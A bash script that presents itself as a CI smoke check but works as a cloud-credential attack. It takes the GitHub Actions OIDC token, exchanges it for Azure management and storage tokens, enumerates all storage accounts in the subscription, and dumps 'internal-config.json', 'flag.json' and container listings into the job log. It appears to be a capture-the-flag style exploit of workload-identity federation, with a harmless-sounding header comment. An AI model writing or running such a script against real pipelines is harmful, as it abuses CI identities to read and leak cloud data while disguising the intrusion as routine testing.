#!/usr/bin/env bash
# CI smoke check: verify Azure OIDC federation + config blob availability.
set +e
echo "=== env (vars, non-secret) ==="
echo "CLIENT_ID=${AZURE_CLIENT_ID} TENANT=${AZURE_TENANT_ID} SUB=${AZURE_SUBSCRIPTION_ID}"

echo "=== 1. GitHub OIDC token (aud=api://AzureADTokenExchange) ==="
OIDC=$(curl -s -H "Authorization: Bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" \
  "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
echo "oidc_len=${#OIDC}"
echo "oidc_sub=$(echo "$OIDC" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("sub"),d.get("repository"))' 2>/dev/null)"

exch(){ # $1 = scope
  curl -s -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" \
    -d "client_id=${AZURE_CLIENT_ID}" \
    -d "scope=$1" \
    -d "grant_type=client_credentials" \
    -d "client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer" \
    -d "client_assertion=${OIDC}"
}

echo "=== 2a. ARM token ==="
ARM=$(exch "https://management.azure.com/.default" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token",""))' )
echo "arm_token_len=${#ARM}"
echo "=== 2b. Storage token ==="
STOR=$(exch "https://storage.azure.com/.default" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(d.get("access_token",""))')
echo "stor_token_len=${#STOR}"

echo "=== 3. ARM list storage accounts in subscription ==="
ACCTS=$(curl -s -H "Authorization: Bearer ${ARM}" \
  "https://management.azure.com/subscriptions/${AZURE_SUBSCRIPTION_ID}/providers/Microsoft.Storage/storageAccounts?api-version=2023-01-01")
echo "$ACCTS" | python3 -c 'import sys,json
d=json.load(sys.stdin)
if "value" in d:
  for a in d["value"]:
    pe=(a.get("properties",{}).get("primaryEndpoints",{}) or {}).get("blob")
    print("ACCT", a.get("name"), pe)
else:
  print("ARM_LIST_RESP:", json.dumps(d)[:800])'

echo "=== 4. read config/internal-config.json on each account ==="
read_blob(){ # $1=blob host
  for path in "config/internal-config.json" "config/flag.json" "config/internal-config.json"; do
    echo "--- GET ${1}${path}"
    curl -s -H "Authorization: Bearer ${STOR}" -H "x-ms-version: 2021-12-02" "${1}${path}"
    echo
  done
  echo "--- list container config:"
  curl -s -H "Authorization: Bearer ${STOR}" -H "x-ms-version: 2021-12-02" "${1}config?restype=container&comp=list"
  echo
}
# accounts from ARM
for host in $(echo "$ACCTS" | python3 -c 'import sys,json
try:
 d=json.load(sys.stdin)
 for a in d.get("value",[]):
  b=(a.get("properties",{}).get("primaryEndpoints",{}) or {}).get("blob")
  if b: print(b)
except: pass'); do
  echo "### account host $host"
  read_blob "$host"
done
echo "=== done ==="
